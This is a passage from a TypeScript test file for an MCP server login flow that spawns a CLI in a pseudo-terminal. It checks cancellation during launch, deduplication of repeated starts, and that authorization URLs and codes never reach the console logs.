    const gate = new Promise<void>((resolve) => { release = resolve; });
    if (stage === 'loadPty') {
      const load = loadPty.getMockImplementation() as () => Promise<PtyModule>;
      loadPty.mockImplementation(async () => { await gate; return load(); });
    } else {
      install({ resolveLauncher: async () => { await gate; return '/usr/local/bin/claude'; } });
    }
    return release;
  }

  it.each(['loadPty', 'resolveLauncher'] as const)('never starts the CLI when the socket closed during %s', async (stage) => {
    const release = holdLaunch(stage);
    const { updates, result } = start();

    cancelAllMcpLogins('c1');
    release();

    expect(await result).toMatchObject({ status: 'error', error: expect.stringContaining('cancelled') });
    expect(spawnCalls).toEqual([]);
    expect(ptys).toEqual([]);
    expect(updates).toEqual([]);
    // Nothing was registered: there is no run to cancel, and the key is free.
    expect(cancelMcpLogin('c1', 'aib-fixture')).toBe(false);
  });

  it('never starts the CLI when the run is cancelled before it has started', async () => {
    const release = holdLaunch('loadPty');
    const { updates, result } = start();

    cancelMcpLogin('c1', 'aib-fixture');
    release();

    expect(await result).toMatchObject({ status: 'error', error: expect.stringContaining('cancelled') });
    expect(spawnCalls).toEqual([]);
    expect(updates).toEqual([]);
  });

  it('leaves the launch of another connection, or another server, alone', async () => {
    const release = holdLaunch('loadPty');
    const closed = start({ connectionId: 'c1' });
    const otherConnection = start({ connectionId: 'c2' });
    const otherServer = start({ connectionId: 'c1', name: 'other' });

    cancelAllMcpLogins('c3');
    cancelMcpLogin('c1', 'aib-fixture');
    release();

    expect(await closed.result).toMatchObject({ status: 'error' });
    expect(await otherConnection.result).toEqual({ status: 'started' });
    expect(await otherServer.result).toEqual({ status: 'started' });
    expect(ptys).toHaveLength(2);
  });

  it('forgets the cancellation once the launch ended, so the same server can start again', async () => {
    const release = holdLaunch('loadPty');
    const first = start();
    cancelAllMcpLogins('c1');
    release();
    await first.result;

    expect(await start().result).toEqual({ status: 'started' });
    expect(ptys).toHaveLength(1);
  });

  it('keeps no cancellation for a connection that had nothing launching', async () => {
    cancelAllMcpLogins('c1');
    cancelMcpLogin('c1', 'aib-fixture');

    expect(await start().result).toEqual({ status: 'started' });
    expect(ptys).toHaveLength(1);
  });
});

describe('a second start for the same server', () => {
  it('re-reports the current state and does not spawn again', async () => {
    const { updates, pty } = await startAwaiting();
    const count = updates.length;

    const again = start();
    expect(await again.result).toEqual({ status: 'started' });

    expect(ptys).toHaveLength(1);
    expect(pty.killed).toBe(0);
    // Same connection, so the first listener is the one that keeps hearing about it.
    expect(again.updates.length + (updates.length - count)).toBe(1);
    const reported = again.updates[0] ?? updates[updates.length - 1];
    expect(reported).toEqual({ name: 'aib-fixture', state: McpAuthenticationState.AWAITING_CALLBACK, url: AUTH_URL });
  });

  it('keeps two quick starts down to one spawn', async () => {
    const a = start();
    const b = start();
    expect(await a.result).toEqual({ status: 'started' });
    expect(await b.result).toEqual({ status: 'started' });

    expect(ptys).toHaveLength(1);
  });

  it('runs different servers, and different connections, side by side', async () => {
    await start({ name: 'a' }).result;
    await start({ name: 'b' }).result;
    await start({ name: 'a', connectionId: 'c2' }).result;

    expect(ptys).toHaveLength(3);
  });
});

describe('what reaches the log', () => {
  it('never contains the authorization URL, the pasted URL or any code', async () => {
    const errors = vi.spyOn(console, 'error').mockImplementation(() => undefined);
    const logs = vi.spyOn(console, 'log').mockImplementation(() => undefined);
    const warns = vi.spyOn(console, 'warn').mockImplementation(() => undefined);

    const { pty } = await startAwaiting();
    submitMcpLoginCallbackUrl('c1', 'aib-fixture', 'http://localhost:1/callback?code=SECRETCODE&state=nope');
    pty.emitData(`ttp://localhost:1/callback?code=SECRETCODE&state=nope\r\n${REJECTION}\r\n`);
    submitMcpLoginCallbackUrl('c1', 'aib-fixture', REDIRECT_URL);
    pty.emitData(`Token exchange failed for ${REDIRECT_URL}\r\n`);
    pty.emitExit(1);
    await start({ name: 'second' }).result;
    cancelMcpLogin('c1', 'second');

    const logged = [...errors.mock.calls, ...logs.mock.calls, ...warns.mock.calls].flat().map(String).join('\n');
    expect(logged).toContain('mcp login "aib-fixture": started');
    expect(logged).not.toContain(AUTH_URL);
    expect(logged).not.toContain('authorize?');
    expect(logged).not.toContain('code=');
    expect(logged).not.toContain('SECRETCODE');
    expect(logged).not.toContain('st4te');
  });
});
